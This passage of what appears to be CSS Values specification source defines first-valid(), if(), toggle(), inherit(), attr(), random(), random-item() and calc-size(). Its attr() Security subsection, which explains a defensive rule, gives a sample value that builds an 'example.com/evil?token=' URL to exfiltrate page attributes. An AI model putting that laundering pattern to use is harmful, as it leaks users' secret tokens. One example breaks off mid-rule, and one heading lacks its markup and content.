
			/* 'animation-*' is not animatable */
			animation-delay: mix(0%, 0s, 2s);
		</pre>
	</div>

<h2 id="value-insert">
Miscellaneous Value Substituting Functions</h2>

<h3 id="whole-value" type lt="<whole-value>">
Representing An Entire Property Value: the <<whole-value>> type</h3>

	Several functions defined in this specification
	can only be used as the "whole value" of a property.
	For example, ''background-position: toggle(50px 50px, center);'' is valid,
	but ''background-position: toggle(50px, center) 50px;'' is not.
	The <<whole-value>> production represents these values.

	All properties implicitly accept a <<whole-value>>
	as their entire value,
	just as they accept the [=CSS-wide keywords=]
	as their entire value.

	When used as a component value of a function,
	<<whole-value>> also represents any CSS value
	normally valid as the whole value
	of the property in which it is used
	(including additional <<whole-value>> functions).
	However, some functions may restrict
	what a <<whole-value>> argument can include.

<h3 id="first-valid">
Selecting the First Supported Value: the ''first-valid()'' notation</h3>

	CSS supports progressive enhancement with its forward-compatible parsing:
	authors can declare the same property multiple times in a style rule,
	using different values each time,
	and a CSS UA will automatically use the last one that it understands
	and throw out the rest.
	This principle, together with the ''@supports'' rule,
	allows authors to write stylesheets that work well
	in old and new UAs simultaneously.

	However, using ''var()''
	(or similar substitution functions that resolve after parsing)
	thwarts this functionality;
	CSS UAs must assume any such property is valid at parse-time.

	The <dfn>first-valid()</dfn> [=functional notation=]
	inlines the fallback behavior
	intrinsic to parsing declarations.
	Unlike most notations,
	it can accept any valid or invalid syntax in its arguments,
	and represents the first value among its arguments
	that is supported (parsed as valid) by the UA
	as the whole value of the property it's used in.

	<pre class=prod>
		<dfn>&lt;first-valid()></dfn> = first-valid( <<declaration-value>># )
	</pre>

	If none of the arguments represent a valid value for the property,
	the property is [=invalid at computed-value time=].

	''first-valid()'' is a <<whole-value>>.

	Issue: Should this have a different name?
	We didn't quite decide on it during the resolution to add this.

	Note: Despite effectively taking <<whole-value>>s as its argument,
	''first-valid()'' is instead defined to take <<declaration-value>>s
	because, by definition,
	it's intended to be used in cases
	<em>where its values might be invalid for the declaration it's in</em>.
	<<declaration-value>> imposes no contextual validity constraints on what it matches,
	unlike <<whole-value>>.

<!-- Big Text: if()
-->

<h3 id="if-notation">
Conditional Value Selection: the ''if()'' notation</h3>

	The <dfn>if()</dfn> notation is an [=arbitrary substitution function=]
	that represents conditional values.
	Its argument consists of an ordered semi-colon&ndash;separated list of statements,
	each consisting of a condition
	followed by a colon
	followed by a value.
	An ''if()'' notation represents
	the value corresponding to the first condition in its argument list to be true;
	if no condition matches,
	then the ''if()'' notation represents an empty token stream.

	The ''if()'' notation syntax is defined as follows:

	<pre class=prod>
	<dfn><<if()>></dfn> = if( [ <<if-condition>> : <<declaration-value>>? ; ]*
	             <<if-condition>> : <<declaration-value>>? ;? )
	<dfn><<if-condition>></dfn> = <<boolean-expr[ <<if-test>> ]>> | else
	<dfn><<if-test>></dfn> =
	  supports( [ <<supports-condition>> | <<ident>> : <<declaration-value>> ] ) |
	  media( <<media-query>> ) |
	  style( <<style-query>> )
	</pre>

	The <dfn value for="if()">else</dfn> keyword represents
	a condition that is always true.

	To <dfn export>[=resolve an arbitrary substitution function|resolve an if() function=]</dfn>,
	return the <<declaration-value>>?
	associated with the first <<if-condition>> that is true;
	if none are true,
	return nothing (an empty token stream).

	Note: Unlike using ''@media''/''@supports''/''@container'' rules,
	which just ignore their contents when they're false
	and let the cascade determine what values otherwise apply,
	declarations with ''if()'' do not roll back the cascade if the conditions are false;
	any fallback values must be provided inline.

<h3 id="toggle-notation">
Toggling Between Values: the ''toggle()'' notation</h3>

	The <dfn>toggle()</dfn> expression allows descendant elements
	to cycle over a list of values instead of inheriting the same value.

	<div class='example'>
		The following example makes <code>&lt;em></code> elements italic in general,
		but makes them normal if they're inside something that's italic:

		<pre>em { font-style: toggle(italic, normal); }</pre>
	</div>

	<div class='example'>
		The following example cycles markers for nested lists,
		so that a top level list has ''list-style-type/disc''-shaped markers,
		but nested lists use ''list-style-type/circle'', then ''list-style-type/square'', then ''list-style-type/box'',
		and then repeat through the list of marker shapes,
		starting again (for the 5th list deep) with ''list-style-type/disc''.

		<pre>ul { list-style-type: toggle(disc, circle, square, box); }</pre>
	</div>

	The syntax of the ''toggle()'' expression is:

	<pre class=prod>
		<dfn><<toggle()>></dfn> = toggle( <<whole-value>># )
	</pre>

	The ''toggle()'' notation is a <<whole-value>>.
	However, it is not allowed to be nested,
	nor may it contain ''attr()'' or ''calc()'' notations;
	declarations containing such constructs are invalid.

	<div class="example">
		The following ''toggle()'' examples are all invalid:

		<pre>
		background-position: 10px toggle(50px, 100px);
		/* toggle() must be the sole value of the property */

		list-style-type: toggle(disc, 50px);
		/* ''50px'' isn't a valid value of 'list-style-type' */
		</pre>
	</div>

	To determine the computed value of ''toggle()'',
	first evaluate each argument as if it were the sole value of the property in which ''toggle()'' is placed
	to determine the computed value that each represents,
	called <var>C<sub>n</sub></var> for the <var>n</var>-th argument to ''toggle()''.
	Then, compare the property's <a>inherited value</a>
	with each <var>C<sub>n</sub></var>.
	For the earliest <var>C<sub>n</sub></var> that matches the <a>inherited value</a>,
	the computed value of ''toggle()'' is <var>C<sub>n+1</sub></var>.
	If the match was the last argument in the list,
	or there was no match,
	the computed value of ''toggle()'' is the computed value that the first argument represents.


	Note: This means that repeating values in a ''toggle()'' short-circuits the list.
	For example ''toggle(1em, 2em, 1em, 4em)'' will be equivalent to ''toggle(1em, 2em)''.

	<!-- Issue: Should this short-circuiting affect the computed value? -->

	Note: That ''toggle()'' explicitly looks at the computed value of the parent,
	so it works even on non-inherited properties.
	This is similar to the ''inherit'' keyword,
	which works even on non-inherited properties.

	Note: That the [=computed value=] of a property is an abstract set of values,
	not a particular serialization [[!CSS21]],
	so comparison between computed values should always be unambiguous and have the expected result.
	For example,
	a Level 2 <l spec=css22>'background-position'</l> computed value
	is just two offsets, each represented as an absolute length or a percentage,
	so the declarations ''background-position: top center'' and ''background-position: 50% 0%''
	produce identical computed values.
	If the "Computed Value" line of a property definition seems to define something ambiguous or overly strict,
	please <a href="#sotd">provide feedback</a> so we can fix it.

	If ''toggle()'' is used on a <a>shorthand property</a>,
	it sets each of its longhands to a ''toggle()'' value
	with arguments corresponding to what the longhand would have received
	had each of the original ''toggle()'' arguments been the sole value of the <a>shorthand</a>.

	<div class="example">
		For example, the following shorthand declaration:

		<pre>margin: toggle(1px 2px, 4px, 1px 5px 4px);</pre>

		is equivalent to the following longhand declarations:

		<pre>
		margin-top:    toggle(1px, 4px, 1px);
		margin-right:  toggle(2px, 4px, 5px);
		margin-bottom: toggle(1px, 4px, 4px);
		margin-left:   toggle(2px, 4px, 5px);
		</pre>

		Note that, since ''1px'' appears twice in the top margin and ''4px'' appears twice in bottom margin,
		they will cycle between only two values
		while the left and right margins cycle through three.
		In other words, the declarations above will yield the same computed values
		as the longhand declarations below:

		<pre>
		margin-top:    toggle(1px, 4px);
		margin-right:  toggle(2px, 4px, 5px);
		margin-bottom: toggle(1px, 4px);
		margin-left:   toggle(2px, 4px, 5px);
		</pre>

		which may not be what was intended.
	</div>

<h3 id="var-notation">
Custom Property References: the ''var()'' notation</h3>

	The ''var()'' notation substitutes the value of a [=custom property=],
	see the <a href="https://www.w3.org/TR/css-variables/#using-variables">CSS Custom Properties for Cascading Variables Module</a>.
	[[CSS-VARIABLES]]

<h3 id="inherit-notation">
Inherited Value References: the ''inherit()'' notation</h3>

	Like the ''inherit'' keyword, the <dfn>inherit()</dfn> [=functional notation=]
	resolves to the [=computed value=] of a property on the parent.
	Rather than resolving to the value of the same property, however,
	it resolves to the tokenized [=computed value=]
	of the property specified as its first argument.
	Its second argument, if present, is used as a fallback
	in case the first argument resolves to the [=guaranteed-invalid value=].

	''inherit()'' is an [=arbitrary substitution function=]
	whose syntax is defined as:

	<pre class=prod>
		<dfn><<inherit()>></dfn> = inherit( <<custom-property-name>>, <<declaration-value>>? )
	</pre>

	To <dfn export>[=resolve an arbitrary substitution function|resolve an inherit() function=]</dfn>,
	return the [=inherited value=] of the [=custom property=] specified by the first argument,
	and (if specified) the fallback specified by the second argument.

	Note: Future levels of CSS may allow specifying standard CSS properties in ''inherit()'';
	however because the tokenization of [=computed values=]
	is not fully standardized for all CSS properties,
	this feature is deferred from Level 5.
	Note that the [=computed value=] differs from the [=used value=],
	and is not always the resolved value returned by {{getComputedStyle()}};
	thus even if ''inherit(width)'' were allowed,
	it would frequently return the keyword ''width/auto'', not the used <<length>>.

<h3 id="attr-notation">
Attribute References: the ''attr()'' notation</h3>

<!--
Ian's proposal:
  http://lists.w3.org/Archives/Member/w3c-css-wg/2002OctDec/0141.html
-->

	The <dfn>attr()</dfn> function substitutes the value of an  <l spec=dom>[=attribute=]</l> on an <l spec=dom>[=/element=]</l>
	into a property,
	similar to how the ''var()'' function
	substitutes a [=custom property=] value into a function.

	<pre class=prod>
		attr() = attr( <<attr-name>> <<attr-type>>? , <<declaration-value>>?)

		<dfn>&lt;attr-name></dfn> = [ <<ident-token>>? '|' ]? <<ident-token>>
		<dfn>&lt;attr-type></dfn> = type( <<syntax>> ) | string | <<attr-unit>>
	</pre>

	The <dfn>&lt;attr-unit></dfn> production matches any [=identifier=]
	that is an [=ASCII case-insensitive=] match
	for the name of a CSS dimension unit,
	such as ''px'',
	or the <<delim-token>> <css>%</css>.
	It is not expanded literally here,
	as the set of units expands over time.

	<!-- Switch the <attr-name> to just use <q-name>
		when Namespaces is rewritten
		to use the current grammar structures. -->

	The arguments of ''attr()'' are:

	: <<attr-name>>
	:: Gives the name of the attribute being referenced,
		similar to <<wq-name>> (from [[SELECTORS-3]])
		but without the possibility of a wildcard prefix.

		If no namespace is specified
		(just an identifier is given, like ''attr(foo)''),
		the null namespace is implied.
		(This is usually what's desired,
		as namespaced attributes are rare.
		In particular, HTML and SVG do not contain namespaced attributes.)
		As with [=attribute selectors=],
		the case-sensitivity of <<attr-name>> depends on the document language.

		If ''attr()'' is used in a property applied to an element,
		it references the attribute of the given name on that element;
		if applied to a pseudo-element,
		the attribute is looked up on the pseudo-element's [=originating element=].

	: <<attr-type>>
	::
		Specifies how the attribute value is [=CSS/parsed=] into a CSS value.

		If given as a ''type()'' function,
		the value is parsed according to the <<syntax>> argument,
		and substitutes as the resulting tokens.
		Values that fail to parse according to the syntax
		trigger fallback.

		If given as an <<attr-unit>> value,
		the value is first parsed as if <css>type(&lt;number>)</css> was specified,
		then the resulting numeric value
		is turned into a dimension with the corresponding unit,
		or a percentage if <css>%</css> was given.
		Values that fail to parse as a <css>&lt;number></css>
		trigger fallback.

		If given as the <css>string</css> keyword,
		or omitted entirely,
		it causes the attribute's literal value
		to be treated as the value of a CSS string,
		with no CSS parsing performed at all
		(including CSS escapes, whitespace removal, comments, etc).
		No value triggers fallback;
		only the lack of the attribute entirely does.

		Note: This is different from specifying a syntax of ''type(*)'',
		which still triggers CSS parsing
		(but with no requirements placed on it
		beyond that it parse validly),
		and which substitutes the result of that parsing directly as tokens,
		rather than as a <<string>> value.

	: <<declaration-value>>
	::
		Specifies a fallback value for the ''attr()'',
		which will be substituted instead of the attribute's value
		if the attribute is missing
		or fails to parse as the specified type.

		If the <<syntax>> argument is omitted,
		the fallback defaults to the empty string if omitted;
		otherwise, it defaults to the [=guaranteed-invalid value=] if omitted.

	If a property contains one or more ''attr()'' functions,
	and those functions are syntactically valid,
	the entire property's grammar must be assumed to be valid at parse time.
	It is only syntax-checked at computed-value time,
	after ''attr()'' functions have been [=substitute an attr()|substituted=].

	<div class='note'>
		Note that the default value need not be of the type given.
		For instance, if the type required of the attribute by the author is ''&lt;number px>'',
		the default could still be <css>auto</css>,
		like in ''width: attr(size &lt;number px>, auto);''.
	</div>

	<div class="example">
		This example shows the use of attr() to visually illustrate data
		in an XML file:

		<xmp>
		<stock>
			<wood length="12"/>
			<wood length="5"/>
			<metal length="19"/>
			<wood length="4"/>

		stock::before {

<h4 id=attr-substitution>
Attribute Value Substitution: the ''attr()'' notation</h4>

	''attr()'' is an [=arbitrary substitution function=],
	similar to ''var()'',
	and so is replaced with the value it represents (if possible)
	at [=computed value=] time;
	otherwise, it's replaced with the [=guaranteed-invalid value=],
	which will make its declaration [=invalid at computed-value time=].

	<div algorithm>
		To <dfn export>[=resolve an arbitrary substitution function|resolve an attr() function=]</dfn>:

		1. Let |el| be the element that the style containing the ''attr()'' function
			is being applied to.
			Let |attr name| be the attribute name specified in the function.
			Let |syntax| be the <<syntax>> specified in the function,
			or null if it was omitted.
			Let |fallback| be the <<declaration-value>>? argument specified in the function,
			or the [=guaranteed-invalid value=] if it was omitted.

		2. If there is no attribute named |attr name| on |el|,
			return the [=guaranteed-invalid value=] and |fallback|.
			Otherwise, let |attr value| be that attribute's value.

		3. If |syntax| is null,
			return a CSS <<string>>
			whose value is |attr value|.

			Note: No parsing or modification of any kind is performed on the value.

		4. [=Parse with a &lt;syntax>=] |attr value|, with |syntax| and |el|.
			Return the result and |fallback|.
	</div>




<h4 id=attr-security>
Security</h4>

	An ''attr()'' function can reference attributes
	that were never intended by the page to be used for styling,
	and might contain sensitive information
	(for example, a security token used by scripts on the page).

	In general, this is fine.
	It is difficult to use ''attr()'' to extract information from a page
	and send it to a hostile party,
	in most circumstances.
	The exception to this is URLs.
	If a URL can be constructed with the value of an arbitrary attribute,
	purely from CSS,
	it can easily send any information stored in attributes
	to a hostile party,
	if 3rd-party CSS is allowed at all.

	To guard against this,
	the values produced by an ''attr()'' are considered <dfn export lt="attr()-taint">attr()-tainted</dfn>,
	as are functions that contain an [=attr()-tainted=] value.

	The substitution value of an [=arbitrary substitution function=]
	is [=attr()-tainted=] <em>as a whole</em>
	if any [=attr()-tainted=] values were involved
	in creating that substitution value.
	<span class=note>This extends to the [=equivalent token sequence=]
	when substituting values of [=registered custom properties=].</span>

	Using an [=attr()-tainted=] value as or in a <<url>>
	makes a declaration [=invalid at computed-value time=].

	<div class=example>
		For example,
		all of the following are [=invalid at computed-value time=]:

		* ''background-image: src(attr(foo));'' - can't use it directly.
		* ''background-image: image(attr(foo))'' - can't use it in other <<url>>-taking functions.
		* ''background-image: src(string("http://example.com/evil?token=" attr(foo)))'' - can't "launder" it thru another function.
		* ''--foo: attr(foo); background-image(src(var(--foo)))'' (assuming that ''--foo'' is a [=registered custom property=] with string syntax) - can't launder the value thru another property, either.

		However, using ''attr()'' for other purposes is fine,
		even if the usage is <em>near</em> a url:

		* ''background-image: image("foo.jpg", attr(bgcolor type(&lt;color>)))'' is fine;
			the ''attr()'' is providing a fallback color,
			and the <<url>> isn't [=attr()-tainted=].

		Using ''attr()'' indirectly via a [=custom property=]
		causes [=attr()-tainting=] of the whole custom property value:

		* ''--foo: image("foo.jpg", attr(bgcolor type(&lt;color&gt;))); background-image: var(--foo);''
			is [=invalid at computed-value time=].

			Issue: Investigate partial tainting of custom property values.
	</div>

	Note: Implementing this restriction
	requires tracking a dirty bit
	on values constructed from ''attr()'' values,
	since they can be fully resolved into a string
	via [=registered custom properties=],
	so you can't rely on just examining the value expression.
	Note that non-string types can even trigger this,
	via functions like <css>string()</css>
	that can stringify other types of values:
	''--foo: attr(foo type(&lt;number&gt;)); background-image: src(string(var(--foo)))''
	needs to be invalid as well.

<h2 id=randomness>
Generating Random Values</h2>

	It is often useful to incorporate some degree of "randomness" to a design,
	either to make repeated elements on a page feel less static and identical,
	or just to add a bit of "flair" to a page without being distracting.

	The ''random()'' and ''random-item()'' functions
	(the <dfn export for=CSS>random functions</dfn>)
	allow authors to incorporate randomness into their page,
	while keeping this randomness predictable from a design perspective,
	letting authors decide whether a random value should be reused in several places
	or be unique between instances.

	The exact random-number generation method is UA-defined.
	It <em>should</em> be the case that two distinct random values
	have no easily-detectable correlation,
	but this specification intentionally does not specify what that means
	in terms of cryptographic strength.
	Authors <em>must not</em> rely on [=random functions=]
	for any purposes that depend on quality cryptography.

<h3 id=random>
Generating a Random Numeric Value: the ''random()'' function</h3>

	The <dfn>random()</dfn> function is a [=math function=]
	that represents a random value between a minimum and maximum value,
	drawn from a uniform distribution,
	optionally limiting the possible values to a step between those limits:

	<pre class=prod>
	&lt;random()> = random( <<random-caching-options>>? , <<calc-sum>>, <<calc-sum>>, [by <<calc-sum>>]? )

	<dfn><<random-caching-options>></dfn> = <<dashed-ident>> || per-element
	</pre>

	Its arguments are:

	<dl>
		: <<random-caching-options>>
		:: The optional <<random-caching-options>>
			provides some control over whether a given ''random()'' function
			resolves similarly or differently to other ''random()''s on the page.
			See [[#random-caching]] for details.

			<div class=note>
				By default, ''random()'' resolves to a single value,
				shared by all elements using that style,
				and two ''random()'' functions with identical arguments
				will resolve to the same random value.

				Providing a <<dashed-ident>> does nothing,
				but can make the argument lists distinct
				between two or more otherwise-identical ''random()'' functions,
				so they'll generate distinct values.

				The ''per-element'' keyword causes the ''random()'' function
				to generate a different value <em>on each element</em> the function is applied to,
				rather than resolving to a single value per usage in the stylesheet.
			</div>

		: <<calc-sum>>, <<calc-sum>>
		:: The two required [=calculations=]
			specify the  minimum and maximum value
			the function can resolve to.
			Both limits are inclusive
			(the result can be the min or the max).

			If the maximum value is less than the minimum value,
			it behaves as if it's equal to the minimum value.

			<div class=example>
				For example, ''random(100px, 300px)''
				will resolve to a random <<length>> between ''100px'' and ''300px'':
				it might be ''100px'', ''300px'', or any value between them like ''234.5px''.
			</div>

		: ''by <<calc-sum>>''
		:: The final optional argument
			specifies a step value:
			the values the function can resolve to
			are further restricted to the form <code>min + (N * step)</code>,
			where N is a non-negative integer
			chosen uniformly randomly from the possible values
			that result in an in-range value.

			<div class=example>
				For example, ''random(100px, 300px, by 50px)''
				can only resolve to ''100px'', ''150px'', ''200px'', ''250px'', or ''300px'';
				it will never return a value like ''120px''.

				While the minimum value is always a possible result,
				the maximum value isn't always,
				if it's not also a multiple of the step from the minimum.
				For example, in ''random(100px, 300px, by 30px)'',
				the largest possible value it can resolve to is ''280px'',
				6 steps from the minimum value.

				Note that rounding issues might have an effect here:
				in ''random(100px, 200px, by 100px / 3)''
				you'll definitely get three possible values
				(''100px'', and approximately ''133.33px'' and ''166.67px''),
				but whether ''200px'' is possible depends on rounding precision.
				To be safe, you can put the maximum value
				<em>slightly above</em> where you expect the final step to land,
				like ''random(100px, 201px, by 100px / 3)''.
			</div>

			<div class=example>
				As explained in the definition of ''round()'',
				CSS has no "natural" precision for values,
				but the step value can be used to assign one.

				For example, ''random(100px, 500px, by 1px)''
				restricts it to resolving only to whole px values;
				''random(1, 10, by 1)''
				is restricted to resolving only to integers;
				etc.
			</div>

			Note: The definition of the step <em>does not</em> allow
			for naively generating a random value in the range
			and then rounding it to the nearest step value,
			as that can result in the values not appearing with the same weights.
			For example, ''random(100px, 200px, by 50px)''
			has to generate the three possible values each with a 1/3 chance;
			a naive rounding-based method will instead incorrectly generate ''150px''
			twice as often as the boundary values.
	</dl>

	All of the [=calculation=] arguments can resolve to any <<number>>, <<dimension>>, or <<percentage>>,
	but must have the <em>same</em> [=determine the type of a calculation|type=], or else the function is invalid;
	the result will have the same type as the arguments.

	<div class=example>
		For example, ''random(50px, 100%, by 1em)'' is valid
		(assuming percentages are valid in the context this is used,
		and resolve to a <<length>>),
		as all three arguments resolve to a length.

		However, ''random(50px, 180deg)'' is invalid,
		as lengths and angles are not the same type.
	</div>

	A ''random()'' function can be [=simplify a calculation tree|simplified=]
	as soon as its argument [=calculations=]
	can be simplified to numeric values.

	Note: This means that ''random()'' is <em>usually</em> resolved
	by [=computed value=] time,
	and thus will inherit as a static numeric value.
	However, if the argument [=calculations=] aren't resolved
	until [=used value=] time
	(such as if they include <<percentage>> values
	that require layout information to resolve),
	[=inheritance=] will transfer the ''random()'' function itself.
	(This is no different, however, to the behavior of the <<percentage>>s themselves,
	which would inherit as <<percentage>>s
	and thus might resolve to different values on the child elements.)


	Issue: At least in theory it should be fine to use ''random()''
	in non-property contexts,
	so long as ''per-element'' isn't specified;
	it's well-defined what happens with <code>@media (max-width: random(100px, 500px)) {...}</code>,
	for example.
	I suspect we want to disallow it, tho?

<h4 id=random-infinities>
Argument Ranges</h4>

	In ''random(A, B, by C)'',
	if A or B is infinite,
	the result is NaN.
	If C is infinite,
	the result is A.

	(If C is zero or negative,
	the result is A,
	but that falls out of the standard definition.)

	Note: As usual for [=math functions=],
	if any argument calculation is NaN,
	the result is NaN.

<h3 id=random-item>
Picking a Random Item From a List: the ''random-item()'' function</h3>

	The <dfn>random-item()</dfn> function
	resolves to a random item
	from among its list of items.

	<pre class=prod>
	&lt;random-item()> = random-item( <<random-caching-options>> , [ <<declaration-value>>? ]# )
	</pre>

	The <em>required</em> <<random-caching-options>>
	is interpreted identically to ''random()''.
	(See [[#random-caching]] for details.)

	<div class=note>
		Like ''random()'',
		the <<dashed-ident>> can be used to force similar ''random-item()'' functions
		to generate distinct random values,
		and ''per-element''
		causes it to resolve to a distinct value on each element.

		Aside from these,
		the grouping of ''random-item()'' functions as "identical"
		is much simpler:
		all that matters is the number of arguments.

		That is, ''random-item(--x, red, blue, green)''
		and ''random-item(--x, 1, 2, 3)''
		will always resolve to the same argument index:
		either ''red'' and ''1'', or ''blue'' and ''2'', or ''green'' and ''3''.
		This allows coordination between groups of properties
		that all want to use a random set of values.

		On the other hand, ''random-item(--x, red, blue, green)''
		and ''random-item(--x, 1, 2, 3, 4)''
		will have no connection to each other;
		any of the 12 possible combinations can occur.
	</div>

	Note: The <<random-caching-options>> argument is required in ''random-item()'',
	but optional in ''random()'',
	both for parsing reasons
	(it's impossible to tell whether ''random-item(--foo, --bar, --baz)''
	has three <<declaration-value>> arguments
	or two and a <<random-caching-options>> argument),
	and because accidentally associating the random generation of ''random-item()'' functions together
	is much easier to do accidentally,
	since only the number of arguments is used to distinguish instances.

	The remaining arguments are arbitrary sequences of CSS values.
	The ''random-item()'' function resolves to one of these sequences,
	chosen uniformly at random.

	The ''random-item()'' function is an [=arbitrary substitution function=],
	like ''var()''.

	<div class=note>
		That is, if you use ''random-item()'':

		* So long as ''random-item()'' itself (and any other [=arbitrary substitution functions=])
			is syntactically valid,
			the entire property is assumed to be valid at parse time.
		* ''random-item()'' is substituted with whatever value it resolves to
			at [=computed value=] time
			when you'd [=substitute a var()=],
			so children all inherit the same resolved value.
		* If the substituted value ends up making the property invalid,
			the property's value becomes the [=guaranteed-invalid value=].
	</div>

	Issue: Define [=arbitrary substitution function=],
	probably over in Variables,
	since we have several upcoming functions leaning on this functionality.

	Issue: Since ''random-item()'' is var()-like,
	we probably want to restrict it to only be usable in properties.
	(This is likely something we want to apply to all such functions.)
	Tho ''random()'' is a fundamentally different kind of value,
	we probably want to restrict it as well,
	for thematic consistency.



<h3 id=random-caching>
Generating/Caching Random Values: the <<random-caching-options>> value</h3>

	In a programming language like JavaScript,
	there's a clear temporal ordering to code,
	so you can tell exactly <em>when</em> something like a call to {{Math/random()|Math.random()}} is evaluated.
	You can also store the results in a variable,
	making it clear when you're reusing a single random value in multiple places,
	versus using a distinct random value in each location.

	CSS, on the other hand, is a declarative language
	(code is not "executed" in any particular order,
	nor is there any control over how many times something is "executed");
	it makes it very easy to apply identical styles to multiple elements
	but difficult to specify distinct values for each of them
	(making it unclear whether a property using ''random()''
	is meant to resolve to the same value on each element it's applied to
	or to distinct values on each);
	and it has very limited "variable" functionality
	(making it difficult to intentionally reuse a particular randomly-generated value in several places).

	To resolve these issues,
	the ''random()'' and ''random-item()'' functions are defined to generate random values
	under the following caching semantics:

	* Each instance of ''random()'' or ''random-item()'' in a stylesheet
		specifies a <dfn>random-caching key</dfn>.
		Two instances of either function must resolve to <em>identical</em> values
		if their [=random-caching keys=] are identical;
		they must resolve to <em>distinct</em> values
		if they're different.

		("Distinct" here means generated by a fresh random operation;
		this might coincidentally result in the same value as another random operation.)

	* For ''random()'',
		the [=random-caching key=]
		is a [=tuple=] of:

		1. The [=used value=] of the minimum [=calculation=].
		2. The [=used value=] of the maximum [=calculation=].
		3. The [=used value=] of the step [=calculation=], if present,
			or null otherwise.
		4. The <<dashed-ident>> part of the <<random-caching-options>>, if present,
			or null otherwise.
		5. If ''per-element'' is specified in the <<random-caching-options>>,
			a unique value per element or pseudo-element the function appears in.

	* For ''random-item()'',
		the [=random-caching key=]
		is a [=tuple=] of:

		1. The number of arguments to the function.
		2. The <<dashed-ident>> part of the <<random-caching-options>>, if present,
			or null otherwise.
		3. If ''per-element'' is specified in the <<random-caching-options>>,
			a unique value per element or pseudo-element the function appears in.

	The "unique value per element or pseudo-element" must have the same lifetime
	as a JavaScript reference to the element
	(or to the [=originating element=] + sufficient additional info to uniquely identify the pseudo-element).
	Elements in separate documents
	(including across refreshes of the same page,
	which produces distinct documents with distinct elements)
	<em>should</em> have distinct unique values.
	(This is not strictly required,
	to allow for pseudo-random generation of these values,
	but uniqueness should be likely enough
	that authors cannot depend on elements having the same values across documents.)

	Additionally, the random generation method <em>should</em>
	generate distinct values for the same operation
	when invoked on different documents
	(including refreshes of the same page).

	<div class=example>
		For example, in the following stylesheet:

		<pre highlight=css>
		.random-square {
			width: random(100px, 500px);
			height: random(100px, 500px);
		}
		</pre>

		The [=random-caching keys=] for both functions are identical:
		<code>(100px, 500px, null, null, null)</code>.
		This means that both will resolve to the exact same value,
		guaranteeing a square element
		with a size somewhere between ''100px'' and ''500px''.
		Additionally, <em>every</em> ''.random-square'' element
		will have the same size.

		On other hand, in this stylesheet:

		<pre highlight=css>
		.random-rect {
			width: random(100px, 500px);
			height: random(--x, 100px, 500px);
		}
		</pre>

		The [=random-caching keys=] are distinct between the two functions:
		the function in 'width' has <code>(100px, 500px, null, null, null)</code>,
		while the function in 'height' has <code>(100px, 500px, null, --x, null)</code>.

		This means the two functions will resolve to distinct random values,
		making it very unlikely for the element to be square.
		However, every element matching ''.random-rect''
		will still have the <em>same</em> random size.

		Changing any aspect of the function also alters this key.
		The following two declarations are similarly distinct,
		resulting in the width and height having no connection to each other:

		<pre highlight=css>
		.random-rect-2 {
			width: random(100px, 500px);
			height: random(100px, 500px, by 50px);
		}
		</pre>

		But so long as the [=used values=] end up identical,
		two functions that look distinct might end up identical.
		For example, in the following code:

		<pre highlight=css>
		.random-square-2 {
			font-size: 16px;
			width: random(160px, 320px);
			height: random(10em, 20em);
		}
		</pre>

		The two functions superficially look different,
		but after the lengths are fully resolved
		they end up with identical [=random-caching keys=];
		each is <code>(160px, 320px, null, null, null)</code>,
		so actually the widths and heights will end up always identical.
	</div>

	<div class=example>
		By default, each instance of a ''random()'' function in a stylesheet
		essentially resolves to a static value,
		which is then shared by every element that property applies to.
		This behavior can be changed with the ''per-element'' keyword.

		For example, in:

		<pre highlight=css>
		.foo { width: random(100px, 500px); }
		</pre>

		Multiple elements matching ''.foo'' will end up with the same random width.

		But in:

		<pre highlight=css>
		.foo { width: random(per-element, 100px, 500px); }
		</pre>

		Every element matching ''.foo'' will get its own <em>unique</em> width.

		Note that this causes the value to be unique per element,
		not per <em>value</em> necessarily.
		For example, in:

		<pre highlight=css>
		.random-squares {
			width: random(per-element, 100px, 500px);
			height: random(per-element, 100px, 500px);
		}
		</pre>

		Every element matching ''.random-squares'' will get a distinct random value,
		but that value will be <em>the same</em> for 'width' and 'height' on a given element,
		making the element square.
		This is because in both properties
		the [=random-caching key=] is <code>(100px, 500px, null, null, [unique value for the element])</code>,
		so both functions will resolve to the same length on a single element.

		This makes random values in [=custom properties=] act more predictably.
		The preceding code could also be written as:

		<pre highlight=css>
		.foo {
			--size: random(per-element, 100px, 500px);
			width: var(--size);
			height: var(--size);
		}
		</pre>
	</div>

Tree Counting Functions: the ''sibling-count()'' and ''sibling-index()'' notations</h2>

<h2 id=calc-size>
Calculating With Intrinsic Sizes: the ''calc-size()'' function</h2>

	When transitioning between two [=definite=] sizes,
	or slightly adjusting an existing definite size,
	''calc()'' works great:
	halfway between ''100%'' and ''20px'' is ''calc(50% + 10px)'',
	''20%'' with a margin of ''15px'' on either side is ''calc(20% + 15px * 2)'',
	etc.

	But these operations are no longer possible if the size you want to adjust
	or transition to/from
	is an [=intrinsic size=],
	for both practical and backward-compatibility reasons.
	The ''calc-size()'' function
	allows math to be performed on intrinsic sizes
	in a safe, well-defined way.

	<pre class=prod>
	<dfn function lt="calc-size()">&lt;calc-size()></dfn> = calc-size( <<calc-size-basis>>, <<calc-sum>> )

	<dfn>&lt;calc-size-basis></dfn> = [ <<intrinsic-size-keyword>> | <<calc-size()>> | any | <<calc-sum>> ]
	</pre>

	The <dfn>&lt;intrinsic-size-keyword></dfn> production
	matches any [=intrinsic size=] keywords allowed in the context.
	For example, in 'width',
	it matches ''width/auto'', ''width/min-content'', ''width/stretch'', etc.

	<details class=note>
		<summary>Why can ''calc-size()'' be nested?</summary>

		Allowing ''calc-size()'' as the basis argument
		means that authors can use a variable as the basis
		(like ''calc-size(var(--foo), size + 20px)'')
		and it will <em>always work</em>
		as long as the variable was originally valid for the property.

		Doing the same with just ''calc()'' doesn't work -
		for example, if you have ''--foo: calc-size(min-content, size + 20px)'',
		or even just ''--foo: min-content'',
		then ''calc( (var(--foo)) + 20px )'' fails.

		The nesting is simplified away during interpolation,
		and at used-value time,
		so the basis always ends up as a simple value
		by the time interpolation and other effects occur;
		see [[#simplifying-calc-size]].
	</details>

	The first argument given is the <dfn>calc-size basis</dfn>,
	and the second is the <dfn>calc-size calculation</dfn>.
	For either argument,
	if a <<calc-sum>> is given,
	its [=CSSNumericValue/type=] must [=CSSNumericValue/match=] <<length-percentage>>,
	and it must resolve to a <<length>>.

	Within the [=calc-size calculation=],
	if the [=calc-size basis=] is not ''calc-size()/any'',
	the keyword <dfn for=calc-size() value>size</dfn> is allowed.
	This keyword is a <<length>>,
	and resolves at [=used value=] time.

	''calc-size()'' represents an [=intrinsic size=].
	It is specifically <em>not</em> a <<length>>;
	any place that wants to accept a ''calc-size()''
	must explicitly include it in its grammar.

